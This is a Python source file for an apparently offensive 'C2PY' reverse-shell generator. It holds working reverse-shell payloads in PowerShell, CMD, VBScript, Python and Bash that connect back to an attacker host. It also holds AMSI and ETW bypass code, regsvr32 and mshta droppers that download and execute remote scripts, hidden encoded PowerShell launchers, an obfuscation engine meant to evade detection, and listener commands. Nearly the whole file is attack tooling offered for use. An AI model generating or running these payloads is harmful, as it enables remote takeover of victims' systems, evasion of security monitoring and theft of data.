#!/usr/bin/env python3
"""
C2PY Framework - Elite Reverse Shell Generator
Advanced payload generation with multiple encoding and obfuscation techniques
"""

import base64
import zlib
import random
import string
import binascii
import json
import re
from typing import Dict, List, Tuple, Optional
from pathlib import Path

class AdvancedObfuscator:
    """Advanced code obfuscation engine"""
    
    def __init__(self):
        self.techniques = {
            "base64": self.base64_encode,
            "hex": self.hex_encode,
            "gzip": self.gzip_compress,
            "xor": self.xor_encode,
            "reverse": self.reverse_string,
            "char_substitution": self.char_substitution,
            "string_splitting": self.string_splitting,
            "variable_mangling": self.variable_mangling,
            "comment_injection": self.comment_injection,
            "case_randomization": self.case_randomization
        }
    
    def base64_encode(self, data: str, iterations: int = 1) -> str:
        """Multiple iterations of base64 encoding"""
        result = data
        for _ in range(iterations):
            result = base64.b64encode(result.encode()).decode()
        return result
    
    def hex_encode(self, data: str) -> str:
        """Hex encoding with random formatting"""
        hex_data = data.encode().hex()
        # Random formatting: 0x notation, uppercase, chunking
        if random.choice([True, False]):
            hex_data = hex_data.upper()
        
        if random.choice([True, False]):
            # Add 0x prefix to chunks
            chunks = [hex_data[i:i+2] for i in range(0, len(hex_data), 2)]
            hex_data = " ".join(f"0x{chunk}" for chunk in chunks)
        
        return hex_data
    
    def gzip_compress(self, data: str) -> str:
        """Gzip compression with base64 encoding"""
        compressed = zlib.compress(data.encode())
        return base64.b64encode(compressed).decode()
    
    def xor_encode(self, data: str, key: str = None) -> Tuple[str, str]:
        """XOR encoding with random key"""
        if not key:
            key = self.generate_random_string(random.randint(4, 16))
        
        result = []
        for i, char in enumerate(data):
            xor_char = ord(char) ^ ord(key[i % len(key)])
            result.append(xor_char)
        
        encoded = base64.b64encode(bytes(result)).decode()
        return encoded, key
    
    def reverse_string(self, data: str) -> str:
        """Reverse string obfuscation"""
        return data[::-1]
    
    def char_substitution(self, data: str) -> str:
        """Character substitution obfuscation"""
        substitutions = {
            'a': '@', 'e': '3', 'i': '!', 'o': '0', 's': '$', 't': '7'
        }
        
        result = data
        for original, substitute in substitutions.items():
            # Random probability of substitution
            if random.random() > 0.5:
                result = result.replace(original, substitute)
                result = result.replace(original.upper(), substitute.upper())
        
        return result
    
    def string_splitting(self, data: str, max_length: int = 20) -> List[str]:
        """Split strings into smaller chunks"""
        chunks = []
        for i in range(0, len(data), max_length):
            chunks.append(data[i:i+max_length])
        return chunks
    
    def variable_mangling(self, code: str) -> str:
        """Mangle variable names in code"""
        # Simple variable name obfuscation
        variables = re.findall(r'\$([a-zA-Z_][a-zA-Z0-9_]*)', code)
        
        for var in set(variables):
            new_var = self.generate_random_string(random.randint(6, 12))
            code = code.replace(f"${var}", f"${new_var}")
        
        return code
    
    def comment_injection(self, code: str) -> str:
        """Inject random comments into code"""
        lines = code.split('\n')
        result = []
        
        for line in lines:
            result.append(line)
            # Random chance to add comment
            if random.random() > 0.7 and line.strip():
                comment = f"# {self.generate_random_string(random.randint(5, 15))}"
                result.append(comment)
        
        return '\n'.join(result)
    
    def case_randomization(self, code: str) -> str:
        """Randomize case of keywords"""
        keywords = ['function', 'if', 'else', 'while', 'for', 'return', 'var', 'let', 'const']
        
        for keyword in keywords:
            if keyword in code.lower():
                # Random case variation
                variations = [
                    keyword.upper(),
                    keyword.lower(),
                    keyword.capitalize(),
                    ''.join(random.choice([c.upper(), c.lower()]) for c in keyword)
                ]
                new_keyword = random.choice(variations)
                code = re.sub(re.escape(keyword), new_keyword, code, flags=re.IGNORECASE)
        
        return code
    
    def generate_random_string(self, length: int) -> str:
        """Generate random string"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def apply_obfuscation(self, data: str, techniques: List[str] = None, intensity: int = 3) -> str:
        """Apply multiple obfuscation techniques"""
        if not techniques:
            techniques = random.sample(list(self.techniques.keys()), min(intensity, len(self.techniques)))
        
        result = data
        applied_techniques = []
        
        for technique in techniques:
            if technique in self.techniques:
                try:
                    if technique == "xor":
                        result, key = self.techniques[technique](result)
                        applied_techniques.append(f"{technique} (key: {key})")
                    else:
                        result = self.techniques[technique](result)
                        applied_techniques.append(technique)
                except Exception as e:
                    continue
        
        return result


class EliteRevShellGenerator:
    """Elite reverse shell generator with advanced obfuscation"""
    
    def __init__(self):
        self.obfuscator = AdvancedObfuscator()
        
        # Payload categories and subcategories
        self.payload_categories = {
            "Windows": {
                "PowerShell": [
                    "Basic TCP", "Encoded TCP", "HTTPS", "DNS", "WMI", "BITS",
                    "Reflection", "In-Memory", "Fileless", "Process Injection"
                ],
                "Command Prompt": [
                    "Basic CMD", "PowerShell Launcher", "WMIC", "Batch File"
                ],
                "Windows Script": [
                    "VBScript", "JScript", "WSH", "HTA Application"
                ],
                "LOLBAS": [
                    "regsvr32", "mshta", "rundll32", "certutil", "bitsadmin",
                    "msxsl", "wmic", "forfiles", "pcalua"
                ],
                ".NET": [
                    "C# TCP", "C# HTTPS", "VB.NET", "PowerShell .NET",
                    "Reflection", "Assembly Loading"
                ]
            },
            "Linux": {
                "Bash": [
                    "TCP /dev/tcp", "Netcat", "Socat", "Python", "Perl",
                    "Ruby", "PHP", "NodeJS"
                ],
                "Binary": [
                    "C Binary", "Go Binary", "Rust Binary"
                ]
            },
            "Cross-Platform": {
                "Python": [
                    "Socket TCP", "Threading", "Subprocess", "HTTP",
                    "Encrypted", "Base64"
                ],
                "JavaScript": [
                    "NodeJS TCP", "WebSocket", "HTTP Request"
                ],
                "Web": [
                    "PHP Web Shell", "ASP Web Shell", "JSP Web Shell"
                ]
            }
        }
        
        # Load LOLBAS generator
        try:
            from src.generators.lolbas_generator import LOLBASGenerator
            self.lolbas_generator = LOLBASGenerator()
        except ImportError:
            self.lolbas_generator = None
    
    def get_categories(self) -> List[str]:
        """Get available payload categories"""
        return list(self.payload_categories.keys())
    
    def get_subcategories(self, category: str) -> List[str]:
        """Get subcategories for a category"""
        return list(self.payload_categories.get(category, {}).keys())
    
    def get_payloads(self, category: str, subcategory: str) -> List[str]:
        """Get payloads for a category/subcategory"""
        return self.payload_categories.get(category, {}).get(subcategory, [])
    
    def get_powershell_evasion_code(self) -> str:
        """Returns PowerShell code for AMSI and ETW bypasses."""
        # AMSI Bypass using amsiInitFailed
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
        
        # ETW Bypass by patching EtwEventWrite
        etw_bypass = """
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$hNtdll = [Win32]::GetModuleHandle("ntdll.dll")
$pEtwEventWrite = [Win32]::GetProcAddress($hNtdll, "EtwEventWrite")
[Win32]::VirtualProtect($pEtwEventWrite, [System.UIntPtr]4, 0x40, [ref]0) | Out-Null
$ret = [System.Runtime.InteropServices.Marshal]::ReadByte($pEtwEventWrite)
if ($ret -eq 0xc3) {
    # Already patched
} else {
    [System.Runtime.InteropServices.Marshal]::WriteByte($pEtwEventWrite, 0xc3)
}
"""
        return amsi_bypass + etw_bypass

    def generate_powershell_tcp(self, lhost: str, lport: int, obfuscate: bool = True) -> str:
        """Generate PowerShell TCP reverse shell"""
        
        payload = f'''
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
        
        if obfuscate:
            payload = self.obfuscator.apply_obfuscation(payload, ["base64", "variable_mangling"], 2)
        
        return payload.strip()
    
    def generate_powershell_encoded(self, lhost: str, lport: int) -> str:
        """Generate encoded PowerShell payload"""
        
        base_payload = self.generate_powershell_tcp(lhost, lport, False)
        
        # Multiple encoding layers
        encoded = base64.b64encode(base_payload.encode('utf-16le')).decode()
        
        # Create encoded command
        final_payload = f"powershell.exe -nop -w hidden -enc {encoded}"
        
        return final_payload
    
    def generate_powershell_https(self, lhost: str, lport: int) -> str:
        """Generate HTTPS PowerShell reverse shell"""
        
        payload = f'''
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
$client = New-Object System.Net.WebClient;
$client.Headers.Add("User-Agent", "Mozilla/5.0");
$client.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$url = "https://{lhost}:{lport}";
while($true){{
    try{{
        $command = $client.DownloadString($url + "/cmd");
        if($command){{
            $result = (iex $command 2>&1 | Out-String);
            $client.UploadString($url + "/result", $result);
        }}
    }}catch{{
        Start-Sleep -Seconds 5;
    }}
}}
'''
        
        return payload.strip()
    
    def generate_cmd_payload(self, lhost: str, lport: int) -> str:
        """Generate CMD reverse shell"""
        
        payload = f'''@echo off
set host={lhost}
set port={lport}
powershell.exe -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('%host%',%port%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
'''
        
        return payload.strip()
    
    def generate_vbscript_payload(self, lhost: str, lport: int) -> str:
        """Generate VBScript reverse shell"""
        
        payload = f'''
Dim objShell, objExec
Set objShell = CreateObject("WScript.Shell")
Set objExec = objShell.Exec("powershell.exe -nop -w hidden -c ""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""")
'''
        
        return payload.strip()
    
    def generate_python_payload(self, lhost: str, lport: int) -> str:
        """Generate Python reverse shell"""
        
        payload = f'''
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    
    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break
        
        if command[:2] == "cd":
            try:
                os.chdir(command[3:])
                s.send(b"Changed directory\\n")
            except:
                s.send(b"Failed to change directory\\n")
        else:
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                s.send(output.encode())
            except:
                s.send(b"Command failed\\n")
    
    s.close()

if __name__ == "__main__":
    connect()
'''
        
        return payload.strip()
    
    def generate_bash_payload(self, lhost: str, lport: int) -> str:
        """Generate Bash reverse shell"""
        
        payload = f'''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
        
        return payload.strip()
    
    def generate_lolbas_payload(self, binary: str, lhost: str, lport: int) -> Tuple[str, str]:
        """Generate LOLBAS payload using specific binary"""
        
        if self.lolbas_generator:
            return self.lolbas_generator.generate_lolbas_payload(binary, lhost, lport)
        else:
            # Fallback basic payloads
            if binary == "regsvr32.exe":
                payload = f'''<?XML version="1.0"?>
<scriptlet>
<registration progid="Update" classid="{{A0000000-0000-0000-0000-000000000000}}">
</registration>
<script language="VBScript">
CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')""", 0, False
</script>
</scriptlet>'''
                command = f"regsvr32.exe /s /n /u /i:payload.sct scrobj.dll"
                return payload, command
            
            elif binary == "mshta.exe":
                payload = f'''<html>
<head><title>Update</title></head>
<body>
<script language="VBScript">
CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')""", 0, False
window.close()
</script>
</body>
</html>'''
                command = f"mshta.exe payload.hta"
                return payload, command
            
            return "# LOLBAS generator not available", f"{binary} payload"
    
    def generate_payload(self, category: str, subcategory: str, payload_type: str, 
                        lhost: str, lport: int, obfuscate: bool = True) -> str:
        """Generate payload based on selection"""
        
        # Map payload types to generation methods
        if category == "Windows":
            if subcategory == "PowerShell":
                if payload_type == "Basic TCP":
                    return self.generate_powershell_tcp(lhost, lport, obfuscate)
                elif payload_type == "Encoded TCP":
                    return self.generate_powershell_encoded(lhost, lport)
                elif payload_type == "HTTPS":
                    return self.generate_powershell_https(lhost, lport)
                    
            elif subcategory == "Command Prompt":
                if payload_type == "Basic CMD":
                    return self.generate_cmd_payload(lhost, lport)
                    
            elif subcategory == "Windows Script":
                if payload_type == "VBScript":
                    return self.generate_vbscript_payload(lhost, lport)
                    
            elif subcategory == "LOLBAS":
                # Extract binary name from payload_type
                binary_map = {
                    "regsvr32": "regsvr32.exe",
                    "mshta": "mshta.exe",
                    "rundll32": "rundll32.exe",
                    "certutil": "certutil.exe",
                    "bitsadmin": "bitsadmin.exe"
                }
                
                binary = binary_map.get(payload_type, f"{payload_type}.exe")
                payload, command = self.generate_lolbas_payload(binary, lhost, lport)
                return f"# Payload file content:\\n{payload}\\n\\n# Execution command:\\n{command}"
        
        elif category == "Cross-Platform":
            if subcategory == "Python":
                return self.generate_python_payload(lhost, lport)
                
        elif category == "Linux":
            if subcategory == "Bash":
                if payload_type == "TCP /dev/tcp":
                    return self.generate_bash_payload(lhost, lport)
        
        return f"# Payload generation not implemented for: {category} -> {subcategory} -> {payload_type}"
    
    def get_listener_command(self, listener_type: str, lport: int) -> str:
        """Generate listener command"""
        
        commands = {
            "netcat": f"nc -lvnp {lport}",
            "ncat": f"ncat -lvnp {lport}",
            "socat": f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash",
            "metasploit": f"use exploit/multi/handler\\nset payload generic/shell_reverse_tcp\\nset LHOST 0.0.0.0\\nset LPORT {lport}\\nexploit"
        }
        
        return commands.get(listener_type, f"nc -lvnp {lport}")
    
    def get_payload_info(self, category: str, subcategory: str, payload_type: str) -> str:
        """Get information about a specific payload"""
        
        info_map = {
            ("Windows", "PowerShell", "Basic TCP"): "Standard PowerShell TCP reverse shell using System.Net.Sockets.TCPClient",
            ("Windows", "PowerShell", "Encoded TCP"): "Base64 encoded PowerShell payload to bypass basic detection",
            ("Windows", "PowerShell", "HTTPS"): "HTTPS-based PowerShell reverse shell for encrypted communication",
            ("Windows", "Command Prompt", "Basic CMD"): "Command prompt batch file that launches PowerShell reverse shell",
            ("Windows", "Windows Script", "VBScript"): "VBScript payload compatible with wscript.exe and cscript.exe",
            ("Cross-Platform", "Python", "Socket TCP"): "Pure Python reverse shell using socket library",
            ("Linux", "Bash", "TCP /dev/tcp"): "Bash reverse shell using /dev/tcp redirection"
        }
        
        key = (category, subcategory, payload_type)
        return info_map.get(key, f"Advanced {payload_type} payload for {category} {subcategory}")


# Compatibility with existing code
class PayloadGenerator:
    """Legacy compatibility class"""
    
    def __init__(self):
        self.elite_generator = EliteRevShellGenerator()
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int) -> str:
        """Generate payload using legacy interface"""
        return self.elite_generator.generate_powershell_tcp(lhost, lport, True)
